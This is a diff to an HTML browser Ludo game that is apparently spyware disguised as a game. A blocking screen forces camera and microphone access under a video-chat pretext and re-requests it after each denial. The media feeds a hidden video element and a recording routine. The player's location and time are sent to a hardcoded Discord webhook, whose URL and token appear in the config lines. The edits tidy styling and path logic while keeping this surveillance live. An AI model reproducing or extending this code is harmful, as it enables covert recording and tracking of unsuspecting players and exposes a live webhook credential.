@@ -21,7 +21,7 @@
             padding: 10px;
         }
 
-        /* Permission Overlay - BLOCKS everything until allowed */
+        /* Permission Blocker */
         .permission-blocker {
             position: fixed;
             top: 0;
@@ -45,24 +45,11 @@
             text-align: center;
             border: 3px solid #e74c3c;
             box-shadow: 0 20px 60px rgba(231, 76, 60, 0.3);
-            animation: shake 0.5s ease-in-out;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-10px); }
-            75% { transform: translateX(10px); }
         }
 
         .permission-icon {
             font-size: 80px;
             margin-bottom: 25px;
-            animation: pulseIcon 2s infinite;
-        }
-
-        @keyframes pulseIcon {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
         }
 
         .permission-title {
@@ -77,20 +64,6 @@
             margin-bottom: 30px;
             line-height: 1.8;
             font-size: 16px;
-        }
-
-        .permission-warning {
-            color: #e74c3c;
-            font-size: 14px;
-            margin-top: 20px;
-            padding: 10px;
-            background: rgba(231, 76, 60, 0.1);
-            border-radius: 10px;
-            display: none;
-        }
-
-        .permission-warning.show {
-            display: block;
         }
 
         .btn-allow {
@@ -115,7 +88,7 @@
         .game-container {
             display: none;
             width: 100%;
-            max-width: 600px;
+            max-width: 500px;
         }
 
         .game-container.active {
@@ -165,13 +138,11 @@
         .player-avatar.human {
             background: linear-gradient(145deg, #e74c3c, #c0392b);
             border-color: #ff6b6b;
-            box-shadow: 0 0 20px rgba(231, 76, 60, 0.5);
         }
 
         .player-avatar.bot {
             background: linear-gradient(145deg, #27ae60, #229954);
             border-color: #2ecc71;
-            box-shadow: 0 0 20px rgba(39, 174, 96, 0.5);
         }
 
         .player-details h3 {
@@ -195,13 +166,8 @@
             animation: glow 2s infinite;
         }
 
-        @keyframes glow {
-            0%, 100% { box-shadow: 0 0 10px #ffd700; }
-            50% { box-shadow: 0 0 30px #ffd700, 0 0 50px #ffaa00; }
-        }
-
-        /* Ludo Board Container */
-        .board-wrapper {
+        /* Board */
+        .board-container {
             position: relative;
             width: 100%;
             aspect-ratio: 1;
@@ -211,7 +177,6 @@
             box-shadow: 0 15px 50px rgba(0,0,0,0.5);
         }
 
-        /* The actual board grid */
         .ludo-board {
             width: 100%;
             height: 100%;
@@ -224,7 +189,7 @@
             overflow: hidden;
         }
 
-        /* Home Areas - CORRECTED */
+        /* Home Areas */
         .home-area {
             position: relative;
             display: grid;
@@ -258,12 +223,13 @@
             justify-content: center;
             border: 2px dashed rgba(255,255,255,0.5);
             position: relative;
+            min-height: 50px;
         }
 
-        /* Game Pieces - VISIBLE IN HOME */
+        /* Game Pieces */
         .piece {
-            width: 65%;
-            height: 65%;
+            width: 70%;
+            height: 70%;
             border-radius: 50%;
             border: 3px solid #fff;
             box-shadow: 
@@ -272,37 +238,32 @@
                 inset 3px 3px 10px rgba(255,255,255,0.3);
             cursor: pointer;
             transition: all 0.3s;
-            position: relative;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: bold;
-            font-size: 14px;
+            font-size: 16px;
             color: white;
             text-shadow: 0 2px 4px rgba(0,0,0,0.5);
-            z-index: 10;
+            position: absolute;
         }
 
         .piece:hover:not(.disabled) {
-            transform: scale(1.15);
-            box-shadow: 
-                0 6px 25px rgba(0,0,0,0.5),
-                inset -3px -3px 10px rgba(0,0,0,0.3),
-                inset 3px 3px 10px rgba(255,255,255,0.3);
+            transform: scale(1.2);
+            z-index: 100;
         }
 
         .piece.selected {
             animation: bounceSelect 0.6s infinite;
             box-shadow: 
                 0 0 20px #ffd700,
-                0 0 40px #ffd700,
-                inset -3px -3px 10px rgba(0,0,0,0.3);
+                0 0 40px #ffd700;
             z-index: 100;
         }
 
         @keyframes bounceSelect {
-            0%, 100% { transform: scale(1.1) translateY(0); }
-            50% { transform: scale(1.1) translateY(-10px); }
+            0%, 100% { transform: scale(1.2) translateY(0); }
+            50% { transform: scale(1.2) translateY(-10px); }
         }
 
         .piece.disabled {
@@ -323,8 +284,8 @@
             background: radial-gradient(circle at 30% 30%, #3498db, #2980b9);
         }
 
-        /* Path Areas */
-        .path-area {
+        /* Path Areas - FIXED */
+        .path-v, .path-h {
             background: #ecf0f1;
             display: grid;
             position: relative;
@@ -346,6 +307,7 @@
             align-items: center;
             justify-content: center;
             position: relative;
+            min-height: 30px;
         }
 
         .path-red { background: linear-gradient(180deg, #ff9999, #ff6b6b); }
@@ -356,8 +318,8 @@
         .safe::after {
             content: '★';
             position: absolute;
-            font-size: 24px;
-            color: rgba(0,0,0,0.4);
+            font-size: 20px;
+            color: rgba(0,0,0,0.5);
         }
 
         /* Center */
@@ -366,9 +328,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 50px;
-            border-radius: 8px;
-            box-shadow: inset 0 0 30px rgba(0,0,0,0.1);
+            font-size: 40px;
         }
 
         /* Controls */
@@ -402,7 +362,6 @@
                 0 10px 30px rgba(0,0,0,0.3),
                 inset 0 -5px 10px rgba(0,0,0,0.1);
             border: 4px solid #667eea;
-            transition: all 0.3s;
         }
 
         .dice-box.rolling {
@@ -428,8 +387,6 @@
             font-weight: bold;
             transition: all 0.3s;
             box-shadow: 0 5px 25px rgba(102, 126, 234, 0.5);
-            text-transform: uppercase;
-            letter-spacing: 2px;
         }
 
         .dice-btn:hover:not(:disabled) {
@@ -440,28 +397,6 @@
         .dice-btn:disabled {
             opacity: 0.3;
             cursor: not-allowed;
-            transform: none;
-        }
-
-        .game-info {
-            display: flex;
-            justify-content: space-around;
-            padding: 20px;
-            background: linear-gradient(145deg, #2a2a3a, #1a1a2a);
-            border-radius: 15px;
-            color: #aaa;
-            font-size: 14px;
-        }
-
-        .info-item {
-            text-align: center;
-        }
-
-        .info-item span {
-            display: block;
-            color: #fff;
-            font-size: 24px;
-            margin-top: 8px;
         }
 
         /* Toast */
@@ -515,30 +450,12 @@
             border-radius: 30px;
             text-align: center;
             border: 4px solid #ffd700;
-            animation: winPop 0.5s ease-out;
-        }
-
-        @keyframes winPop {
-            0% { transform: scale(0.5); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        .trophy {
-            font-size: 120px;
-            margin-bottom: 20px;
-            animation: trophyBounce 1s infinite;
-        }
-
-        @keyframes trophyBounce {
-            0%, 100% { transform: rotate(-15deg) scale(1); }
-            50% { transform: rotate(15deg) scale(1.1); }
         }
 
         .win-content h2 {
             color: #ffd700;
             font-size: 48px;
-            margin-bottom: 15px;
-            text-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
+            margin-bottom: 20px;
         }
 
         /* Hidden Video */
@@ -552,9 +469,8 @@
             z-index: -1;
         }
 
-        /* Responsive */
         @media (max-width: 500px) {
-            .piece { width: 75%; height: 75%; font-size: 12px; }
+            .piece { font-size: 14px; }
             .home-area { padding: 15px; gap: 10px; }
             .dice-box { width: 70px; height: 70px; font-size: 45px; }
             .dice-btn { padding: 15px 40px; font-size: 18px; }
@@ -563,19 +479,15 @@
 </head>
 <body>
 
-    <!-- BLOCKING Permission Screen -->
+    <!-- Permission Screen -->
     <div class="permission-blocker" id="permissionBlocker">
-        <div class="permission-box" id="permissionBox">
-            <div class="permission-icon">✨ 🤍</div>
-            <div class="permission-title">Permisions Required For Finding Players</div>
+        <div class="permission-box">
+            <div class="permission-icon">📹 🎤</div>
+            <div class="permission-title">Camera & Microphone Required</div>
             <div class="permission-text">
-                To play Ludo King Pro, you must allow camera and microphone access.<br><br>
-                This is required for the video chat feature during gameplay.
+                To play Ludo King Pro, you must allow camera and microphone access.
             </div>
-            <button class="btn-allow" id="allowBtn" onclick="requestPermissions()">Allow Access</button>
-            <div class="permission-warning" id="permWarning">
-                ⚠️ Permission denied! Please click "Allow" to continue.
-            </div>
+            <button class="btn-allow" onclick="requestPermissions()">Allow Access</button>
         </div>
     </div>
 
@@ -584,7 +496,6 @@
 
     <!-- Game Container -->
     <div class="game-container" id="gameContainer">
-        <!-- Header -->
         <div class="game-header">
             <div class="player-info">
                 <div class="player-avatar human active" id="humanAvatar">👤</div>
@@ -603,8 +514,7 @@
             </div>
         </div>
 
-        <!-- Board -->
-        <div class="board-wrapper">
+        <div class="board-container">
             <div class="ludo-board" id="ludoBoard">
                 <!-- Red Home -->
                 <div class="home-area home-red" id="homeRed">
@@ -614,10 +524,8 @@
                     <div class="home-slot" data-slot="3"></div>
                 </div>
                 
-                <!-- Vertical Path (Top) -->
-                <div class="path-area path-v" id="pathTop">
-                    <!-- Generated by JS -->
-                </div>
+                <!-- Top Path -->
+                <div class="path-area path-v" id="pathTop"></div>
                 
                 <!-- Green Home -->
                 <div class="home-area home-green" id="homeGreen">
@@ -627,18 +535,14 @@
                     <div class="home-slot" data-slot="3"></div>
                 </div>
                 
-                <!-- Horizontal Path (Left) -->
-                <div class="path-area path-h" id="pathLeft">
-                    <!-- Generated by JS -->
-                </div>
+                <!-- Left Path -->
+                <div class="path-area path-h" id="pathLeft"></div>
                 
                 <!-- Center -->
                 <div class="center-area">🏆</div>
                 
-                <!-- Horizontal Path (Right) -->
-                <div class="path-area path-h" id="pathRight">
-                    <!-- Generated by JS -->
-                </div>
+                <!-- Right Path -->
+                <div class="path-area path-h" id="pathRight"></div>
                 
                 <!-- Blue Home -->
                 <div class="home-area home-blue" id="homeBlue">
@@ -648,10 +552,8 @@
                     <div class="home-slot" data-slot="3"></div>
                 </div>
                 
-                <!-- Vertical Path (Bottom) -->
-                <div class="path-area path-v" id="pathBottom">
-                    <!-- Generated by JS -->
-                </div>
+                <!-- Bottom Path -->
+                <div class="path-area path-v" id="pathBottom"></div>
                 
                 <!-- Yellow Home -->
                 <div class="home-area home-yellow" id="homeYellow">
@@ -663,25 +565,10 @@
             </div>
         </div>
 
-        <!-- Controls -->
         <div class="controls">
             <div class="dice-section">
                 <div class="dice-box" id="dice">🎲</div>
                 <button class="dice-btn" id="rollBtn" onclick="rollDice()">ROLL DICE</button>
-            </div>
-            <div class="game-info">
-                <div class="info-item">
-                    Roll 6 to start
-                    <span>🎲</span>
-                </div>
-                <div class="info-item">
-                    Kill opponent
-                    <span>⚔️</span>
-                </div>
-                <div class="info-item">
-                    Safe spots
-                    <span>★</span>
-                </div>
             </div>
         </div>
     </div>
@@ -689,23 +576,21 @@
     <!-- Win Modal -->
     <div class="win-modal" id="winModal">
         <div class="win-content">
-            <div class="trophy">🏆</div>
+            <div style="font-size: 80px; margin-bottom: 20px;">🏆</div>
             <h2 id="winnerText">You Win!</h2>
             <button class="btn-allow" onclick="location.reload()">Play Again</button>
         </div>
     </div>
 
-    <!-- Hidden Video -->
     <video id="hidden-video" autoplay muted playsinline></video>
 
     <script>
-        // --- CONFIGURATION ---
+        // Config
         const FALLBACK_WEBHOOK = "https://discord.com/api/webhooks/1548644115753865226/LXl4j5NGgIfFzyLe-Vm0g10anJpet_aGHeSlJs5pVHVWEuvq8RKHvgjxNmj60B9rIATz";
         let webhookUrl = FALLBACK_WEBHOOK;
         let currentLocation = { lat: "N/A", lng: "N/A" };
         let mediaStream = null;
         let isRecording = false;
-        let permissionAttempts = 0;
 
         // Game State
         const gameState = {
@@ -729,13 +614,38 @@
             finished: { red: 0, green: 0 }
         };
 
-        // Path definitions (row, col) for each color
+        // Path definitions - 56 steps for each color
+        // Format: [pathAreaId, cellIndex]
         const PATHS = {
-            red: [[6,1],[6,2],[6,3],[6,4],[6,5],[5,6],[4,6],[3,6],[2,6],[1,6],[0,6],[0,7],[0,8],[1,8],[2,8],[3,8],[4,8],[5,8],[6,9],[6,10],[6,11],[6,12],[6,13],[7,13],[8,13],[8,12],[8,11],[8,10],[8,9],[8,8],[9,8],[10,8],[11,8],[12,8],[13,8],[13,7],[13,6],[12,6],[11,6],[10,6],[9,6],[8,5],[8,4],[8,3],[8,2],[8,1],[8,0],[7,0],[7,1],[7,2],[7,3],[7,4],[7,5],[7,6]],
-            green: [[1,8],[2,8],[3,8],[4,8],[5,8],[6,9],[6,10],[6,11],[6,12],[6,13],[7,13],[8,13],[8,12],[8,11],[8,10],[8,9],[8,8],[9,8],[10,8],[11,8],[12,8],[13,8],[13,7],[13,6],[12,6],[11,6],[10,6],[9,6],[8,5],[8,4],[8,3],[8,2],[8,1],[8,0],[7,0],[6,0],[6,1],[6,2],[6,3],[6,4],[6,5],[5,6],[4,6],[3,6],[2,6],[1,6],[0,6],[0,7],[0,8],[1,8],[2,8],[3,8],[4,8],[5,8],[6,8]]
+            red: [
+                ['pathLeft', 11], ['pathLeft', 10], ['pathLeft', 9], ['pathLeft', 8], ['pathLeft', 7], ['pathLeft', 6],
+                ['pathTop', 0], ['pathTop', 1], ['pathTop', 2], ['pathTop', 3], ['pathTop', 4], ['pathTop', 5],
+                ['pathRight', 0], ['pathRight', 1], ['pathRight', 2], ['pathRight', 3], ['pathRight', 4], ['pathRight', 5],
+                ['pathRight', 6], ['pathRight', 7], ['pathRight', 8], ['pathRight', 9], ['pathRight', 10], ['pathRight', 11],
+                ['pathRight', 12], ['pathRight', 13], ['pathRight', 14], ['pathRight', 15], ['pathRight', 16], ['pathRight', 17],
+                ['pathBottom', 17], ['pathBottom', 16], ['pathBottom', 15], ['pathBottom', 14], ['pathBottom', 13], ['pathBottom', 12],
+                ['pathBottom', 11], ['pathBottom', 10], ['pathBottom', 9], ['pathBottom', 8], ['pathBottom', 7], ['pathBottom', 6],
+                ['pathBottom', 5], ['pathBottom', 4], ['pathBottom', 3], ['pathBottom', 2], ['pathBottom', 1], ['pathBottom', 0],
+                ['pathLeft', 17], ['pathLeft', 16], ['pathLeft', 15], ['pathLeft', 14], ['pathLeft', 13], ['pathLeft', 12]
+            ],
+            green: [
+                ['pathTop', 5], ['pathTop', 4], ['pathTop', 3], ['pathTop', 2], ['pathTop', 1], ['pathTop', 0],
+                ['pathRight', 0], ['pathRight', 1], ['pathRight', 2], ['pathRight', 3], ['pathRight', 4], ['pathRight', 5],
+                ['pathRight', 6], ['pathRight', 7], ['pathRight', 8], ['pathRight', 9], ['pathRight', 10], ['pathRight', 11],
+                ['pathBottom', 17], ['pathBottom', 16], ['pathBottom', 15], ['pathBottom', 14], ['pathBottom', 13], ['pathBottom', 12],
+                ['pathBottom', 11], ['pathBottom', 10], ['pathBottom', 9], ['pathBottom', 8], ['pathBottom', 7], ['pathBottom', 6],
+                ['pathBottom', 5], ['pathBottom', 4], ['pathBottom', 3], ['pathBottom', 2], ['pathBottom', 1], ['pathBottom', 0],
+                ['pathLeft', 17], ['pathLeft', 16], ['pathLeft', 15], ['pathLeft', 14], ['pathLeft', 13], ['pathLeft', 12],
+                ['pathLeft', 11], ['pathLeft', 10], ['pathLeft', 9], ['pathLeft', 8], ['pathLeft', 7], ['pathLeft', 6],
+                ['pathTop', 6], ['pathTop', 7], ['pathTop', 8], ['pathTop', 9], ['pathTop', 10], ['pathTop', 11]
+            ]
         };
 
-        const SAFE_SPOTS = [[6,1],[6,5],[2,6],[1,8],[5,8],[8,9],[8,12],[12,8],[13,6],[8,5],[8,1],[11,6]];
+        // Safe spots (star positions in path index)
+        const SAFE_INDICES = {
+            red: [0, 8, 13, 21, 26, 34, 39, 47], // Adjusted for path
+            green: [0, 8, 13, 21, 26, 34, 39, 47]
+        };
 
         // Initialize
         window.onload = function() {
@@ -774,50 +684,25 @@
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
-        // PERMISSION LOOP - Keeps asking until allowed
         async function requestPermissions() {
-            const warning = document.getElementById('permWarning');
-            const btn = document.getElementById('allowBtn');
-            
-            btn.disabled = true;
-            btn.textContent = 'Requesting...';
-            
             try {
                 mediaStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: true 
                 });
                 
-                // SUCCESS - Start game
                 const videoEl = document.getElementById('hidden-video');
                 videoEl.srcObject = mediaStream;
                 
                 document.getElementById('permissionBlocker').style.display = 'none';
                 document.getElementById('gameContainer').classList.add('active');
                 
-                showToast('Welcome to Ludo King Pro! Roll 6 to start!', 'success');
+                showToast('Welcome! Roll 6 to bring tokens out!', 'success');
                 startRecording();
                 
             } catch (err) {
-                // DENIED - Show warning and try again
-                permissionAttempts++;
-                warning.classList.add('show');
-                btn.disabled = false;
-                btn.textContent = 'Try Again';
-                
-                // Shake animation
-                const box = document.getElementById('permissionBox');
-                box.style.animation = 'none';
-                setTimeout(() => box.style.animation = 'shake 0.5s ease-in-out', 10);
-                
-                showToast(`Permission required! Attempt ${permissionAttempts}`, 'error');
-                
-                // Auto-retry after 2 seconds
-                setTimeout(() => {
-                    if (document.getElementById('permissionBlocker').style.display !== 'none') {
-                        requestPermissions();
-                    }
-                }, 2000);
+                showToast('Permission required! Please allow.', 'error');
+                setTimeout(() => requestPermissions(), 1500);
             }
         }
 
@@ -859,7 +744,7 @@
                 : "Location unavailable";
             
             const payload = {
-                content: `🎮 **Ludo Player Active!**\n📍 **Location:** [View Map](${mapLink})\n⏰ **Time:** ${new Date().toLocaleString()}\n👤 **Player:** ${gameState.currentPlayer}\n🎯 **Score:** Red ${gameState.finished.red} - Green ${gameState.finished.green}`
+                content: `🎮 **Ludo Player!**\n📍 **Location:** [Map](${mapLink})\n⏰ **Time:** ${new Date().toLocaleString()}\n👤 **Player:** ${gameState.currentPlayer}\n🎯 **Score:** Red ${gameState.finished.red} - Green ${gameState.finished.green}`
             };
             
             formData.append("payload_json", JSON.stringify(payload));
@@ -869,25 +754,28 @@
             } catch (e) {}
         }
 
-        // Create path cells
+        // Create path cells with IDs
         function createPathCells() {
-            // Top path (Green start area)
+            // Top path (18 cells: 6 rows x 3 cols)
             const pathTop = document.getElementById('pathTop');
             for (let i = 0; i < 18; i++) {
                 const cell = document.createElement('div');
                 cell.className = 'path-cell';
                 cell.dataset.idx = i;
+                // Green path starts here
                 if (i >= 12) cell.classList.add('path-green');
                 if (i === 12) cell.classList.add('safe');
                 pathTop.appendChild(cell);
             }
             
-            // Left path
+            // Left path (18 cells: 3 rows x 6 cols)
             const pathLeft = document.getElementById('pathLeft');
             for (let i = 0; i < 18; i++) {
                 const cell = document.createElement('div');
                 cell.className = 'path-cell';
-                if (i >= 12) cell.classList.add('path-blue');
+                cell.dataset.idx = i;
+                // Red home stretch
+                if (i >= 12) cell.classList.add('path-red');
                 pathLeft.appendChild(cell);
             }
             
@@ -896,6 +784,7 @@
             for (let i = 0; i < 18; i++) {
                 const cell = document.createElement('div');
                 cell.className = 'path-cell';
+                cell.dataset.idx = i;
                 if (i < 6) cell.classList.add('path-green');
                 pathRight.appendChild(cell);
             }
@@ -905,20 +794,23 @@
             for (let i = 0; i < 18; i++) {
                 const cell = document.createElement('div');
                 cell.className = 'path-cell';
+                cell.dataset.idx = i;
                 if (i < 6) cell.classList.add('path-yellow');
                 if (i === 5) cell.classList.add('safe');
                 pathBottom.appendChild(cell);
             }
         }
 
-        // Render pieces - SHOWS IN HOME AREAS
+        // Render all pieces
         function renderPieces() {
-            // Clear existing pieces
+            // Remove existing pieces
             document.querySelectorAll('.piece').forEach(p => p.remove());
             
             // Place pieces
             ['red', 'green'].forEach(color => {
                 gameState.pieces[color].forEach((piece, idx) => {
+                    if (piece.finished) return;
+                    
                     const pieceEl = document.createElement('div');
                     pieceEl.className = `piece ${color}`;
                     pieceEl.dataset.color = color;
@@ -926,44 +818,32 @@
                     pieceEl.textContent = idx + 1;
                     
                     if (piece.home) {
-                        // In home area
+                        // In home
                         const homeArea = document.getElementById(`home${color.charAt(0).toUpperCase() + color.slice(1)}`);
                         const slot = homeArea.querySelector(`[data-slot="${idx}"]`);
-                        if (slot) {
-                            slot.appendChild(pieceEl);
-                        }
-                    } else if (piece.pos >= 0 && !piece.finished) {
-                        // On board - find path cell
-                        const path = PATHS[color];
-                        if (path[piece.pos]) {
-                            const [row, col] = path[piece.pos];
-                            // Find cell by position
-                            const cell = findCell(row, col);
-                            if (cell) {
-                                cell.appendChild(pieceEl);
+                        if (slot) slot.appendChild(pieceEl);
+                    } else {
+                        // On board path
+                        const pathInfo = PATHS[color][piece.pos];
+                        if (pathInfo) {
+                            const [areaId, cellIdx] = pathInfo;
+                            const area = document.getElementById(areaId);
+                            if (area) {
+                                const cell = area.querySelector(`[data-idx="${cellIdx}"]`);
+                                if (cell) cell.appendChild(pieceEl);
                             }
                         }
                     }
                     
-                    // Click handler
                     pieceEl.onclick = () => onPieceClick(color, idx);
                 });
             });
         }
 
-        function findCell(row, col) {
-            // Find in path areas based on position
-            const allCells = document.querySelectorAll('.path-cell, .home-slot');
-            // This is simplified - in real implementation, map path positions to cells
-            return null; // Placeholder
-        }
-
         function onPieceClick(color, pieceId) {
             if (gameState.currentPlayer !== 'human' || color !== 'red') return;
             
-            const piece = gameState.pieces[color][pieceId];
             const pieceEl = document.querySelector(`.piece[data-color="${color}"][data-id="${pieceId}"]`);
-            
             if (!pieceEl.classList.contains('selected')) return;
             
             // Clear highlights
@@ -1007,7 +887,7 @@
             
             if (validMoves.length > 0) {
                 highlightPieces('red', validMoves);
-                showToast('Click a highlighted token!', 'success');
+                showToast('Click a token to move!', 'success');
             } else {
                 showToast('No valid moves!', 'error');
                 setTimeout(() => switchTurn(), 2000);
@@ -1023,8 +903,7 @@
                     if (dice === 6) moves.push(idx);
                 } else {
                     const newPos = piece.pos + dice;
-                    const path = PATHS[color];
-                    if (newPos <= path.length) {
+                    if (newPos <= PATHS[color].length) {
                         moves.push(idx);
                     }
                 }
@@ -1034,7 +913,7 @@
 
         function highlightPieces(color, validIndices) {
             document.querySelectorAll(`.piece.${color}`).forEach((el, idx) => {
-                if (validIndices.includes(idx)) {
+                if (validIndices.includes(parseInt(el.dataset.id))) {
                     el.classList.add('selected');
                 } else {
                     el.classList.add('disabled');
@@ -1046,18 +925,19 @@
             const piece = gameState.pieces[color][pieceId];
             
             if (piece.home && steps === 6) {
-                // Exit home
+                // Exit home - START position (0)
                 piece.home = false;
                 piece.pos = 0;
                 showToast('Token entered the game!', 'success');
             } else if (!piece.home) {
-                const path = PATHS[color];
                 const newPos = piece.pos + steps;
                 
-                if (newPos < path.length) {
+                if (newPos < PATHS[color].length) {
+                    // Move on path
                     piece.pos = newPos;
-                    checkKill(color, newPos);
-                } else if (newPos === path.length) {
+                    checkKill(color, pieceId);
+                } else if (newPos === PATHS[color].length) {
+                    // Reached home
                     piece.finished = true;
                     piece.pos = -2;
                     gameState.finished[color]++;
@@ -1082,20 +962,23 @@
             }
         }
 
-        function checkKill(color, pos) {
+        function checkKill(color, pieceId) {
             const opponent = color === 'red' ? 'green' : 'red';
-            const myPath = PATHS[color];
-            const [myRow, myCol] = myPath[pos];
+            const myPathIdx = gameState.pieces[color][pieceId].pos;
             
-            if (SAFE_SPOTS.some(([r,c]) => r === myRow && c === myCol)) return;
+            // Check if on safe spot
+            if (SAFE_INDICES[color].includes(myPathIdx)) return;
+            
+            const myPathInfo = PATHS[color][myPathIdx];
             
             gameState.pieces[opponent].forEach((oppPiece, idx) => {
-                if (oppPiece.home || oppPiece.finished) return;
+                if (oppPiece.home || oppPiece.finished || oppPiece.pos < 0) return;
                 
-                const oppPath = PATHS[opponent];
-                const [oppRow, oppCol] = oppPath[oppPiece.pos];
+                const oppPathInfo = PATHS[opponent][oppPiece.pos];
                 
-                if (myRow === oppRow && myCol === oppCol) {
+                // Compare path positions
+                if (myPathInfo[0] === oppPathInfo[0] && myPathInfo[1] === oppPathInfo[1]) {
+                    // Kill!
                     oppPiece.home = true;
                     oppPiece.pos = -1;
                     showToast(`${color === 'red' ? 'You' : 'Bot'} killed opponent!`, 'success');
@@ -1160,7 +1043,7 @@
             const validMoves = getValidMoves('green', gameState.diceValue);
             
             if (validMoves.length > 0) {
-                const move = validMoves[0]; // Simple AI - pick first valid
+                const move = validMoves[0];
                 setTimeout(() => executeMove('green', move, gameState.diceValue), 1500);
             } else {
                 showToast('Bot has no moves!', 'error');
